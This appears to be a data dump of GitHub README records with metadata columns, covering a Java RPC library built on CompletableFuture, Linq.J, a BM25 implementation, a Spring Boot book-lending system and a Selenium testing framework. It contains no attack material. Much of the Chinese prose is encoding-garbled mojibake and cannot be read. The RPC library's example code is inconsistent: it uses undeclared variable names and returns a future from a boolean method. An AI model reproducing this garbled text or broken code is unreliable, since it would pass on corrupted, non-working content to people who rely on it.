    
    // ç”¨æˆ·å®é™…åº”è¯¥æ”¯ä»˜çš„è¯å“ä»·æ ¼
    double realPrice = itemPrice * rate;
    
    // è·å–ç”¨æˆ·è´¦å·å†å¹´ä½™é¢ï¼Œé™å®šäº†åªèƒ½ä½¿ç”¨å†å¹´ä½™é¢è´­ä¹°ï¼ŒRPCè°ƒç”¨
    double balance = userService.getBalance(userId);
            
    return realPrice <= balance;
}
```

åœ¨åŒæ­¥è°ƒç”¨ç³»ç»Ÿä¸­ï¼Œå»¶è¿ŸåŒæ—¶ä¼šå¯¼è‡´ååé‡çš„ä¸‹é™ã€‚å¦‚æœåªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆç³»ç»Ÿæ¯ç§’çš„ååé‡å°†ä¸ä¼šé«˜äº 1000ms / 30msï¼Œä¹Ÿå°±æ˜¯æœ€å¤š 33 qpsã€‚åŒæ­¥ç³»ç»Ÿè¦æé«˜ååé‡ï¼Œå”¯ä¸€çš„åŠæ³•å°±æ˜¯åŠ å¤§çº¿ç¨‹æ•°ã€‚åŒæ—¶å¯ç”¨ 1,000 ä¸ªçº¿ç¨‹ï¼Œååé‡ç†è®ºå€¼å¯ä»¥ä¸Šå‡åˆ° 33,333 qpsã€‚ä¸è¿‡å®é™…ä½¿ç”¨ä¸­ï¼Œè¿™å¹¶ä¸æ˜¯å®Œç¾çš„æ–¹æ¡ˆï¼šå¢åŠ çº¿ç¨‹æ•°é‡ä¼šå¯¼è‡´é¢‘ç¹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œç³»ç»Ÿæ•´ä½“æ€§èƒ½å°†ä¼šä¸¥é‡ä¸‹é™ã€‚


å¼•å…¥Futureï¼š3 ä¸ª rpc è°ƒç”¨å¯ä»¥åŒæ—¶è¿›è¡Œäº†ï¼Œç³»ç»Ÿå»¶è¿Ÿé™ä½ä¸ºä¹‹å‰çš„ 1/3ã€‚ä¸è¿‡å»¶è¿Ÿé™ä½ååé‡çš„é—®é¢˜è¿˜æ˜¯æ²¡æœ‰è§£å†³ï¼Œä¾ç„¶éœ€è¦é€šè¿‡å¢åŠ çº¿ç¨‹æ•°æ¥æå‡ååé‡ã€‚
```Java
public boolean provingOrder(long userId, long itemId, double rate) {
  // éªŒè¯ç”¨æˆ·èƒ½å¦äº«å—è¿™ä¸€å¾…é‡ï¼ŒRPCè°ƒç”¨
    Future<Boolean> provingDiscountFuture = discountService.proving(userId, itemId, rate);
    
   // è·å–è¯å“å•ä»·ï¼ŒRPCè°ƒç”¨
    Future<Double> itemPriceFuture = storeService.getPrice(itemId);
    
 // è·å–ç”¨æˆ·è´¦å·å†å¹´ä½™é¢ï¼Œé™å®šäº†åªèƒ½ä½¿ç”¨å†å¹´ä½™é¢è´­ä¹°ï¼ŒRPCè°ƒç”¨
    Future<Double> balanceFuture = userService.getBalance(userId);

    if(!provingDiscountFuture.get()) {
        // è¯¥ç”¨æˆ·æ— æ³•äº«å—è¿™ä¸€æŠ˜æ‰£
        return false;
    }

    // ç”¨æˆ·å®é™…åº”è¯¥æ”¯ä»˜çš„è¯å“ä»·æ ¼
    double realPrice = itemPriceFuture.get() * rate;

    // ç”¨æˆ·è´¦å·å†å¹´ä½™é¢
    double balance = balanceFuture.get();
            
    return realPrice <= balance;
}
```

å¼•å…¥CompletableFuture:å»¶è¿Ÿé™ä½ä¸ºåŸæ¥ 1/3ï¼ŒåŒæ—¶ååé‡ä¹Ÿä¸ä¼šå› ä¸ºå»¶è¿Ÿè€Œé™ä½ã€‚éå¸¸å®Œç¾ï¼Œç®€å•é«˜æ•ˆï¼ŒCompletableFuture ç»å¯¹ç§°å¾—ä¸Šæ˜¯å¤§æ€å™¨ã€‚åœ¨ rpc å¼‚æ­¥è°ƒç”¨è¿™ä¸ªé—®é¢˜ä¸Šï¼Œæ²¡ä»€ä¹ˆæ¯” CompletableFuture æ›´é€‚åˆçš„è§£å†³æ–¹æ¡ˆäº†ã€‚CompletableFuture æ˜¯ Doug Lea çš„åˆä¸€åŠ›ä½œï¼Œå½»åº•è§£å†³äº† Future çš„ç¼ºé™·ï¼ŒæŠŠ Java å¸¦å…¥äº†å¼‚æ­¥å“åº”å¼ç¼–ç¨‹çš„æ–°ä¸–ç•Œã€‚
```Java
 
public boolean provingOrder(long userId, long itemId, double rate) {
  // éªŒè¯ç”¨æˆ·èƒ½å¦äº«å—è¿™ä¸€å¾…é‡ï¼ŒRPCè°ƒç”¨
    Future<Boolean> provingDiscountFuture = discountService.proving(userId, itemId, rate);
    
   // è·å–è¯å“å•ä»·ï¼ŒRPCè°ƒç”¨
    Future<Double> itemPriceFuture = storeService.getPrice(itemId);
    
 // è·å–ç”¨æˆ·è´¦å·å†å¹´ä½™é¢ï¼Œé™å®šäº†åªèƒ½ä½¿ç”¨å†å¹´ä½™é¢è´­ä¹°ï¼ŒRPCè°ƒç”¨
    Future<Double> balanceFuture = userService.getBalance(userId);

return CompletableFuture
        .allOf(verifyDiscountFuture, itemPriceFuture, balanceFuture)
        .thenApply(v -> {
            if(!verifyDiscountFuture.get()) {
                // è¯¥ç”¨æˆ·æ— æ³•äº«å—è¿™ä¸€æŠ˜æ‰£
                return false;
            }

            // ç”¨æˆ·å®é™…åº”è¯¥æ”¯ä»˜çš„ä»·æ ¼
            double realPrice = itemPriceFuture.get() * rate;

            // ç”¨æˆ·è´¦å·ä½™é¢
            double balance = balanceFuture.get();
                    
            return realPrice <= balance;
        });    
}
```

  demo1:åˆ—å‡ºä¸€ä¸ªå°demo,å…·ä½“éƒ¨åˆ†è§ä»£ç 
  ```Java
private <T> CompletableFuture<T> handleResult(//
			final Request request, //
			final CompletableFuture<Response> future, //
			final Invoker<CompletableFuture<?>> failoverInvoker, //
			final MethodParam methodParam) {
```
## 2 Serializable and Deserialize  pull_in MethodParam

é«˜æ€§èƒ½çš„æ–¹æ³•å‚æ•°å°è£…ï¼Œå‡å°‘è‡ªåŠ¨è£…ç®±è°ƒç”¨ï¼Œé€šè¿‡å­—èŠ‚ç ç”Ÿæˆç›´æ¥è°ƒç”¨ã€‚

æ–¹æ³•å‚æ•°å°è£…ï¼Œç”¨äºåºåˆ—åŒ–ä¼ è¾“å‚æ•°æ•°æ®ï¼Œå…¶å®ç°ç±»ä¼šè‡ªåŠ¨æ ¹æ®æ–¹æ³•åç§°ç”Ÿæˆget/setæ–¹æ³•ã€‚

```Java
public static Class<? extends MethodParam> createClass(Method method)
			throws CannotCompileException, NotFoundException {
		Objects.requireNonNull(method, ""method must not be null"");

		if (method.getParameterCount() == 0) {
			return EmptyMethodParam.class;
		}

		Class<? extends MethodParam> methodParamClass = methodParamClassMap.get(method);
		if (methodParamClass != null) {
			return methodParamClass;
		}

		synchronized (MethodParamClassFactory.class) {
			methodParamClass = methodParamClassMap.get(method);
			if (methodParamClass != null) {
				return methodParamClass;
			}

			methodParamClass = doCreateClass(method);
			methodParamClassMap.put(method, methodParamClass);
		}

		return methodParamClass;
	}
```
## 3
Dubbo çš„æ¶ˆæ¯æ ¼å¼
```Java
public class RpcInvocation implements Invocation, Serializable {
    private String methodName;
    private Class<?>[] parameterTypes;
    private Object[] arguments;
    ...
}
```
åŸºæœ¬çš„å†…ç½®æœåŠ¡ï¼Œå»ºç«‹è¿æ¥åéœ€è¦è°ƒç”¨,å°†æ–¹æ³•ä»¥åŠå‚æ•°å°è£…æˆMethodParamç±»ï¼Œå›ºå®šæ­»é¡ºåºï¼Œä¿è¯serviceIdä¸ºé¢„è®¾å€¼ï¼Œä¸ºæ¯ä¸ªæ–¹æ³•è®¾ç½®ä¸€ä¸ªidå­˜å…¥ConcurrentHashMap.é€šè¿‡æœåŠ¡idè·å–invoker
```Java
	@Override
	public CompletableFuture<List<String>> getClassRegisterList() {
		return CompletableFuture.completedFuture(invokerFactory.getClassRegisterList());
	}
```

# Contact
If you have any issues or feature requests, please contact us. PR is welcomed.
https://github.com/zhushimmer/enhance-rpc-zt/issues
",0,0,1,0.0,"['description', 'usage', 'enhance', 'future', 'change', 'completalefutue', 'serializable', 'deserialize', 'methodparam', 'contact']","['description', 'usage', 'enhance', 'future', 'change']",9.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,8.0,1.0
erupts/Linq.J,main,"# Linq.J A Memory-based Object Query language
[ä¸­æ–‡](./README-zh.md) / English

`Java uses Linq capabilities similar to C#` [C# Linq](https://learn.microsoft.com/zh-cn/dotnet/csharp/linq/)

<p>
    <a href=""https://www.erupt.xyz"" target=""_blank""><img src=""https://img.shields.io/badge/Linq.J-brightgreen"" alt=""Erupt Framework""></a>
    <a href=""https://mvnrepository.com/search?q=linq.j""><img src=""https://img.shields.io/maven-central/v/xyz.erupt/linq.j"" alt=""maven-central""></a>
    <a href=""https://www.oracle.com/technetwork/java/javase/downloads/index.html""><img src=""https://img.shields.io/badge/JDK-8+-green.svg"" alt=""jdk 8+""></a>
    <a href=""./LICENSE""><img src=""https://img.shields.io/badge/license-MIT-blue"" alt=""license Apache 2.0""></a>
    <a href='https://gitee.com/erupt/linq/stargazers'><img src='https://gitee.com/erupt/linq/badge/star.svg?theme=gray' alt='GitEE star' ></img></a>
    <a href=""https://github.com/erupts/linq.j""><img src=""https://img.shields.io/github/stars/erupts/linq.j?style=social"" alt=""GitHub stars""></a>
</p>

### Linq is Object oriented sql, linq is actually a query on the data in memory, enabling developers to write queries more easily. These query expressions look a lot like SQL

> You can join, filter, sort, and group data sources with minimal code. These operations can be combined in a single query to obtain more complex results

#### allows you to write Java code that manipulates in-memory data in the same way that you query a database, for example
- List, Array
- SQL result data
- CSV, XML, JSON document datasets
- Stream, File stream

#### Application Scenarios
- Result association for RPCS such as Feign/Dubbo during distributed development
- In-memory computation of heterogeneous system data
- Use code to organize SQL result data
- Sorted aggregation of multiple result objects with in-memory paging
- Semantic object transformation and mapping
- Clean code, no need for loops and branches to manipulate data
- Federated access across data sources

#### Operation syntax
`From` `Select` `Distinct`ã€`Join`ã€`Where`ã€`Group By`ã€`Order By`ã€`Limit`ã€`Offset`ã€`...`

#### Tips
âš ï¸ Note: The object field must have a get method to facilitate lambda lookup. It is recommended to use the **Lombok** @Getter annotation to quickly create get access to the field

#### How to Use
It has zero external dependencies and is only 50kb in size
```xml
<dependency>
    <groupId>xyz.erupt</groupId>
    <artifactId>linq.j</artifactId>
    <version>0.0.5</version>
</dependency>
```

#### Example 1
```javascript
var strings = Linq.from(""C"", ""A"", ""B"", ""B"").gt(Th::is, ""A"").orderByDesc(Th::is).write(String.class);
// [C, B, B]

var integers = Linq.from(1, 2, 3, 7, 6, 5).orderBy(Th::is).write(Integer.class);
// [1, 2, 3, 5, 6, 7]

var name = Linq.from(data)
    // left join
    .innerJoin(target, Target::getId, Data::getId)
    // where like
    .like(Data::getName, ""a"")
    // select name
    .select(Data::getName)
    // distinct
    .distinct()
    // order by 
    .orderBy(Data::getName)
    .write(String.class);

```

#### Example 2
```java
public class ObjectQuery{

    private final List<TestSource> source = http.get(""https://gw.alipayobjects.com/os/antfincdn/v6MvZBUBsQ/column-data.json"");

    private final List<TestSourceExt> target = mongodb.query(""db.target.find()"");
    
    /**
     * select demo
     */
    public void select(){
        // select *
        Linq.from(source).select(TestSource.class);
        // select a, b, c
        Linq.from(source)
                .select(TestSource::getName, TestSource::getDate, TestSource::getTags)
                .select(TestSource::getTags, ""tag2"") // alias
                .select(Columns.ofx(TestSource::getId, id -> id + ""xxx"")); // value convert
        // select count(*), sum(id), max(id) 
        Linq.from(source)
                .select(Columns.count(""count""))
                .select(Columns.sum(TestSource::getId, ""sum""))
                .select(Columns.max(TestSource::getId, ""max""));
    }

    
    /**
     * join demo
     */
    public void join(){
        // left join
        Linq.from(source).leftJoin(target, TestSourceExt::getId, TestSource::getId)
                .select(TestSource.class)
                .select(TestSourceExt::getName)
                .select(TestSourceExt2::getValue);
        // right join
        Linq.from(source).rightJoin(target, TestSourceExt::getId, TestSource::getId);
        // inner join
        Linq.from(source).innerJoin(target, TestSourceExt::getId, TestSource::getId);
        // full join
        Linq.from(source).fullJoin(target, TestSourceExt::getId, TestSource::getId);
    }

    
    /**
     * where demo
     */
    public void where() {
        // =
        Linq.from(source).eq(TestSource::getName, ""Thanos"").select(Columns.count(countAlias)).writeOne(Integer.class);
        // >=:lval and <=:rval
        Linq.from(source).between(TestSource::getId, 1, 3);
        // in (x,x,x)
        Linq.from(source).in(TestSource::getId, 1, 2, 3);
        // like '%x%'
        Linq.from(source).like(TestSource::getName, ""a"");
        // is null
        Linq.from(source).isNull(TestSource::getId);
        
        // customer single field where
        Linq.from(source).where(TestSource::getId, id -> id >= 5);
        
        // customer condition or multi field
        Linq.from(source).where(data -> {
            String name = data.get(TestSource::getName);
            Integer age = (Integer)data.get(TestSource::getAge);
            // name = 'xxx' or age > 10
            return ""xxx"".equals(name) || age > 10;
        });
    }

    
    /**
     * group by demo
     */
    public void groupBy(){
        Linq.from(source)
            .groupBy(TestSource::getName)
            .select(
                Columns.of(TestSource::getName, ""name""),
                Columns.min(TestSource::getDate, ""min""),
                Columns.avg(TestSource::getId, ""avg""),
                Columns.count(""count""),
                Columns.count(TestSource::getName, ""countName""),
                Columns.countDistinct(TestSource::getName, ""countDistinct"")
            )
            .having(row -> Integer.parseInt(row.get(""avg"").toString()) > 2)
            .orderBy(TestSource::getAge);
    }

    
    /**
     * result write demo
     */
    public void write(){
        // write List<Object>
        List<TestSource> list = Linq.from(source).orderByAsc(TestSource::getDate).write(TestSource.class);
        // write Object
        TestSource obj = Linq.from(source).limit(3).writeOne(TestSource.class);
        // write List<Map>
        List<Map<String, Object>> map = Linq.from(source).writeMap();
        // write Map
        Map<String, Object> mapOne = Linq.from(source).writeMapOne();
    }
    
}

```

#### Next iteration plan

- [ ] Supports combining multiple query result sets: UNION ALL, UNION, INTERSECT, EXCEPT, UNION BY NAME
- [ ] Supports window functions
- [ ] Support Nested loop join
- [x] supports having
- [x] Support group column format group by date(created_at)",5,0,2,7.0,"['a', 'object', 'query', 'language', 'linq', 'http', 'linq', 'object', 'orient', 'sql', 'linq', 'actually', 'query', 'data', 'memory', 'enable', 'developer', 'write', 'query', 'easily', 'these', 'query', 'expression', 'look', 'lot', 'like', 'sql', 'allows', 'write', 'java', 'code', 'manipulate', 'data', 'way', 'query', 'database', 'example', 'application', 'scenario', 'operation', 'syntax', 'tip', 'how', 'use', 'example', 'example', 'next', 'iteration', 'plan']","['query', 'linq', 'example', 'object', 'sql']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-scm-plugin,org.apache.maven.plugins:maven-source-plugin]",0.0,1.0,0.0
vsouzx/Events-Driven-Ecommerce,main,"# Ecommerce Events Driven Architecture
<h3>Project Architecture</h3>
<img src=""https://github.com/vsouzx/Events-Driven-Ecommerce/assets/88911545/d4a488ae-8052-4f8f-8161-d8ca498498fa""></img>
<h3>Used technologies</h3>
<p>-Java</p>
<p>-Spring</p>
<p>-MongoDB</p>
<p>-SNS</p>
<p>-SQS</p>
<p>-Lambda</p>
<p>-Bucket S3</p>
",0,1,1,0.0,"['ecommerce', 'event', 'driven', 'architecture']","['ecommerce', 'event', 'driven', 'architecture']",4.0,"[org.apache.maven.plugins:maven-shade-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,0.0
stephanj/BM25,master,"# BM25 Java Implementation

BM25 (Best Matching 25) is a ranking function used by search engines to rank matching documents according to their relevance to a given search query.

See also https://en.wikipedia.org/wiki/Okapi_BM25

# Simple usage

```java
List<String> corpus = List.of(
      ""I love programming"",
      ""Java is my favorite programming language"",
      ""I enjoy writing code in Java"",
      ""Java is another popular programming language"",
      ""I find programming fascinating"",
      ""I love Java"",
      ""I prefer Java over Python""
  );

  BM25 bm25 = new BM25(corpus);

  List<Map.Entry<Integer, Double>> results = bm25.search(""I love java"");

  for (Map.Entry<Integer, Double> entry : results) {
      System.out.println(""Sentence "" + entry.getKey() + "" : Score = "" + entry.getValue() + "" - ["" + corpus.get(entry.getKey()) + ""]"");
  }
```

```
Sentence 5 : Score = 2.286729869084079 - [I love Java]
Sentence 0 : Score = 1.8387268317084793 - [I love programming]
Sentence 6 : Score = 0.7294916714788526 - [I prefer Java over Python]
Sentence 2 : Score = 0.6674701123652661 - [I enjoy writing code in Java]
Sentence 4 : Score = 0.40211004330297734 - [I find programming fascinating]
Sentence 1 : Score = 0.33373505618263305 - [Java is my favorite programming language]
Sentence 3 : Score = 0.33373505618263305 - [Java is another popular programming language]
```

```Java
bm25.search(""programming"");
```

```
Sentence 0 : Score = 0.687935390645563 - [I love programming]
Sentence 4 : Score = 0.6174639603843102 - [I find programming fascinating]
Sentence 1 : Score = 0.5124700885780712 - [Java is my favorite programming language]
Sentence 3 : Score = 0.5124700885780712 - [Java is another popular programming language]
Sentence 2 : Score = 0.0 - [I enjoy writing code in Java]
Sentence 5 : Score = 0.0 - [I love Java]
Sentence 6 : Score = 0.0 - [I prefer Java over Python]
```

# With stop words 

Get better results by removing language-specific stop words. 

Based on ISO provided list from https://github.com/stopwords-iso 

Current implementation supports English, French, German, Dutch, Italian and Spanish stop words.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH);
```

# With Stemming

Get better results by using stemming. 

Stemming maps different forms of the same word to a common ""stem"". 
For example, the English stemmer maps running, run, runs to run. 
So a search for 'running' would also find documents which only have the other forms.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH, new EnglishStemmer());
```

The default implementation uses the Porter2 stemmer from Snowball.  
You can add other Stemmer implementations, for example, CoreNLP or Lucene.

",0,0,3,2.0,"['java', 'implementation', 'simple', 'usage', 'with', 'stop', 'word', 'with', 'stem']","['with', 'java', 'implementation', 'simple', 'usage']",1.0,[],0.0,1.0,0.0
caolib/book_management_system,master,"[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=cascadia+code&size=38&duration=3500&pause=1000&color=00ADFF&center=true&vCenter=true&random=false&width=1000&height=100&lines=Book+lending+management+system;å›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿ)](https://git.io/typing-svg)

&emsp;&emsp;

![springboot](https://img.shields.io/badge/springboot-v3.0.9-%236DB33F?style=flat&logo=springboot&logoColor=236DB33F&labelColor=white)
![maven](https://img.shields.io/badge/Maven-v3.9.5-blue?style=flat&logo=apachemaven&logoColor=red&labelColor=white)
![mybatisplus](https://img.shields.io/badge/MybatisPlus-v3.5.3.1-red?style=flat&labelColor=white)
![mysql](https://img.shields.io/badge/MySQL-v8.2.0-blue?style=flat&logo=mysql&logoColor=blue&labelColor=white)
![redis](https://img.shields.io/badge/Redis-v7.0.12-red?style=flat&logo=redis&logoColor=%23DC382D&labelColor=white)
![GitHub Release](https://img.shields.io/github/v/release/tankingcao/java_design?include_prereleases&sort=date&display_name=release&style=flat&labelColor=red&cacheSeconds=3600)
![ä¸‹è½½é‡](https://img.shields.io/github/downloads/caolib/book_management_system/total.svg)

<!-- 
![GitHub License](https://img.shields.io/github/license/caolib/book_management_system?style=flat)
![opened issues](https://img.shields.io/github/issues/caolib/book_management_system?color=red&cacheSeconds=3600)
![closed issues](https://img.shields.io/github/issues-closed/caolib/book_management_system?color=green&cacheSeconds=3600)
![GitHub commit activity](https://img.shields.io/github/commit-activity/y/caolib/book_management_system?labelColor=red)
-->

ä½¿ç”¨`springboot+mybatis-plus`æ¡†æ¶åˆ¶ä½œçš„ä¸€ä¸ªç®€å•çš„å›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿåå°æœåŠ¡å™¨

> [!important]
>
> **é¡¹ç›®é‡‡ç”¨å‰åç«¯åˆ†ç¦»å¼€å‘ï¼Œè¿™æ˜¯åç«¯é¡¹ç›®ï¼Œå¯¹åº”çš„[å‰ç«¯é¡¹ç›®åœ°å€](https://github.com/caolib/vue3-vite)ï¼Œæ³¨æ„ç›¸å…³æŠ€æœ¯æ ˆç‰ˆæœ¬ä¸è¦ç›¸å·®å¤ªå¤§**

> [!caution]
>
> - **æœ€è¿‘æ›´æ–°ä¸­å› ä¸ºä½¿ç”¨`redis`äºŒæ¬¡æ ¡éªŒtokenå®ç°tokenä¸»åŠ¨è¿‡æœŸï¼Œ`redis`å˜æˆå¿…éœ€é¡¹!!!**
> - **åœ¨[å‘è¡Œç‰ˆ](https://github.com/caolib/book_management_system/releases)çš„èµ„æºä¸­æœ‰æ­¤é¡¹ç›®å¯¹åº”çš„æ•°æ®åº“ç»“æ„çš„`sql`æ–‡ä»¶**

> [!tip]
> - ä½¿ç”¨å‰å…ˆä½¿ç”¨mavenä¸‹è½½ç›¸å…³ä¾èµ–ï¼Œå»ºè®®ä½¿ç”¨IDEAç¼–è¯‘å™¨ï¼Œæ†ç»‘äº†mavenï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨
> - æ³¨æ„å‰åç«¯ä¸€èˆ¬æ˜¯åŒæ—¶ä¿®æ”¹çš„ï¼Œå¿…é¡»åŒ¹é…ç‰ˆæœ¬ï¼Œæ²¡æœ‰ç‰¹åˆ«éœ€æ±‚ï¼ˆä¸æƒ³ä½¿ç”¨redisï¼‰ç›´æ¥ä½¿ç”¨æœ€æ–°çš„

## å¿«é€Ÿå¼€å§‹

### 1.å‚ç…§æ³¨é‡Šä¿®æ”¹é…ç½®æ–‡ä»¶

è·¯å¾„ï¼š`src/main/resources/application.yml`

```yml
# é¡¹ç›®å¯åŠ¨ç«¯å£ï¼Œé»˜è®¤8080ï¼Œä¿®æ”¹åå‰ç«¯ä¸­çš„è¯·æ±‚åœ°å€ä¹Ÿè¦å¯¹åº”ä¿®æ”¹
server:
  port: 8080

# mybatis-plusé…ç½®
mybatis-plus:
  configuration:
    map-underscore-to-camel-case: true # ä¸‹åˆ’çº¿å‘½åè½¬é©¼å³°
  type-aliases-package: com.clb.domain # åˆ«åæ‰«æåŒ…
  mapper-locations: classpath:mapper/*.xml # mapperæ–‡ä»¶æ‰«æ

spring:
  # mysql
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/java_design?serverTimezone=Asia/Shanghai
    # æ³¨æ„ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç ä¸ºä½ è‡ªå·±çš„
    username: root
    password: 123456
    type: com.alibaba.druid.pool.DruidDataSource

  # redis
  data:
    redis:
      # ä¿®æ”¹hostå’Œå¯†ç ä¸ºä½ çš„ï¼Œå¦‚æœæ²¡æœ‰å¯†ç åˆ™åˆ é™¤passwordé¡¹ï¼Œredisé»˜è®¤æ²¡æœ‰å¯†ç 
      host: localhost
      password: 123456
      port: 6379
      database: 0
      timeout: 5000ms
  cache:
    type: redis  
    redis:
      time-to-live: 3600000 # ç¼“å­˜è¿‡æœŸæ—¶é—´,å•ä½ms(æ­¤å¤„ä¸€å°æ—¶)

  # çƒ­é‡è½½æ’é™¤adviceæ–‡ä»¶
  devtools:
    restart:
      additional-exclude: com/clb/util/Advice.class
  # æ”¯æŒæ§åˆ¶å°ansié¢œè‰²è¾“å‡º(ä½¿ç”¨javaå‘½ä»¤è¡Œéƒ¨ç½²æ—¶),å¦‚æœä¹±ç åˆ™åˆ é™¤ä¸‹é¢3è¡Œ
  output:
    ansi:
      enabled: always
      
# æ—¥å¿—
logging:
  level:
    com.clb: debug
  pattern:
    dateformat: MM-dd HH:mm:ss.SSS

```

### 2.å¯åŠ¨é¡¹ç›®

ä½¿ç”¨ç¼–è¯‘å™¨ä¸€é”®å¯åŠ¨é¡¹ç›®(å‰æ:mysqlå’Œredisæ•°æ®åº“é…ç½®æ­£ç¡®ä¸”å·²ç»å¯åŠ¨)

## é¡¹ç›®ç›®å½•ç»“æ„

- `src/main/java/com/clb/`
  - `config`ï¼šé…ç½®æ–‡ä»¶
  - `constant`ï¼šæšä¸¾å­—æ®µ
  - `controller`ï¼šè¡¨ç°å±‚
  - `domain`ï¼šå®ä½“ç±»ç­‰
  - `exception`ï¼šå¼‚å¸¸ç±»
  - `handle`ï¼šå¤„ç†å™¨ç±»
  - `interceptor`ï¼šæ‹¦æˆªå™¨ç±»
  - `mapper`ï¼šæŒä¹…å±‚
  - `service`ï¼šä¸šåŠ¡å±‚
  - `util`ï¼šå·¥å…·ç±»
- `src/main/resources`
  - `mapper`ï¼šæ˜ å°„æ–‡ä»¶mapper
  - `application.yml`ï¼šé…ç½®æ–‡ä»¶
  - `banner.txt`ï¼šspringé¡¹ç›®å¯åŠ¨logo
- `src/test/`ï¼šæµ‹è¯•ç±»
- `pom.xml`ï¼šä¾èµ–ç®¡ç†

## æ‰“åŒ…ä½¿ç”¨

> å°†é¡¹ç›®ä½¿ç”¨mavenæ‰“æˆjaråŒ…åå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ‰§è¡ŒjaråŒ…

```cmd
java -jar .\book-1.0.0.RELEASE.jar
```

> å¯ä»¥ä¿®æ”¹ç«¯å£å·

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081
```

> ~ä¹Ÿå¯ä»¥å…³é—­redis~

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081 --spring.cache.type=none
```

> [!tip]
> æ­¤é¡¹ç›®å¯¹åº”çš„[å¾®æœåŠ¡ç‰ˆæœ¬](https://github.com/caolib/cloud-book)

## æäº¤åˆ†æ
![Alt](https://repobeats.axiom.co/api/embed/fff6dbaa9aa86bbe35a974910b89f89dd10a3383.svg ""Repobeats analytics image"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=caolib/book_management_system,caolib/vue3-vite&type=Timeline)](https://star-history.com/#caolib/book_management_system&caolib/vue3-vite&Timeline)
",1,0,1,0.0,"['mysql', 'redis', 'star', 'history']","['mysql', 'redis', 'star', 'history']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
naveenanimation20/SeleniumKeywordDrivenFramework,master,"<img width=""1241"" alt=""Screenshot 2024-03-04 at 8 02 29 PM"" src=""https://github.com/naveenanimation20/SeleniumKeywordDrivenFramework/assets/6771652/ac54588d-c63d-4af8-8466-35401410bf02""># Keyword Driven Testing Framework with Selenium

## Overview
This project demonstrates a Keyword Driven Testing (KDT) framework implemented using Selenium WebDriver in Java. The framework allows for easy creation and execution of automated test cases using a set of keywords defined in CSV files.

## Features
- Keyword-driven approach for writing test cases.
- Test cases defined in CSV files for easy maintenance and readability.
- Support for parallel execution of test cases.
- Integration with TestNG for test execution and reporting.
- Flexible and extensible architecture.

## Project Structure
- `src/main/java/`: Contains the source code for the Keyword Driven Testing framework.
- `src/test/java/`: Contains the test scripts written using the framework.
- `src/test/resources/csvs/`: Contains the CSV files defining the test cases in the form of keywords.
- `testng.xml`: TestNG configuration file for executing the tests.

## Setup Instructions
1. Clone the repository to your local machine.
2. Import the project into your preferred Java IDE (e.g., Eclipse, IntelliJ IDEA).
3. Ensure that you have the necessary dependencies configured (e.g., Selenium WebDriver, TestNG).
4. Define your test cases in CSV files located in the `src/test/resources/csvs/` directory.

## Running Tests
- You can run the tests using the TestNG XML configuration file (`testng.xml`).
- Execute the `testng.xml` file using your IDE or the TestNG command-line interface.
- Ensure that the WebDriver instance is properly initialized and managed during test execution.
- Parallel run through thread-count and parallel tags in testng.xml

## Console Output
- You can see the full csv file formatted data in the console output.
<img width=""1241"" alt=""Screenshot 2024-03-04 at 8 02 29 PM"" src=""https://github.com/naveenanimation20/SeleniumKeywordDrivenFramework/assets/6771652/a621fb1a-5114-41d5-84cb-31de4c18c2f8"">


## Test Reporting
- TestNG generates detailed HTML reports after test execution.
- The reports provide information about test results, including pass/fail status and error messages.
- Integrated Extent and Allure reports as well, including pass/fail status, error messages and screenshot for failure tests.

## Information about reporting tools used in the project, such as Allure, ExtentReport.

- Allure Report
  Allure is a flexible lightweight test report tool that not only shows a very concise representation of what have been tested in a neat web report form, but allows everyone participating in the development process to extract maximum of useful information from everyday execution of tests.

- To generate Allure reports, follow these steps:

- Install Allure command-line tool using the instructions provided in the Allure documentation.

Execute your tests with Allure listeners attached.

After the test execution is complete, generate the Allure report using the command:
**allure generate --clean
**
- View the generated report by running:
**allure open
**
<img width=""1792"" alt=""Screenshot 2024-03-04 at 7 36 36 PM"" src=""https://github.com/naveenanimation20/SeleniumKeywordDrivenFramework/assets/6771652/da6085b3-6cd2-4ee2-8fdc-d9deb29834ca"">

<img width=""1787"" alt=""Screenshot 2024-03-04 at 7 36 59 PM"" src=""https://github.com/naveenanimation20/SeleniumKeywordDrivenFramework/assets/6771652/4004cccc-2ce3-4c3e-b3a2-bbeac55b7d92"">

<img width=""1766"" alt=""Screenshot 2024-03-04 at 7 53 04 PM"" src=""https://github.com/naveenanimation20/SeleniumKeywordDrivenFramework/assets/6771652/5e3dfd3f-bc28-4510-829e-22fd4e0f22a3"">

- Extent Report
  ExtentReports is an open-source reporting library for Java designed for the creation of beautiful, interactive, and detailed HTML reports.
  - After the test execution is complete, the Extent report will be generated automatically.
  - View the generated Extent report in the /reports directory.

  <img width=""1461"" alt=""Screenshot 2024-03-04 at 7 38 08 PM"" src=""https://github.com/naveenanimation20/SeleniumKeywordDrivenFramework/assets/6771652/c77caa57-dd74-4220-8006-d2b06bee17c8"">

<img width=""1455"" alt=""Screenshot 2024-03-04 at 7 38 29 PM"" src=""https://github.com/naveenanimation20/SeleniumKeywordDrivenFramework/assets/6771652/cabde873-0151-4ad5-8828-7b6e1325aca8"">

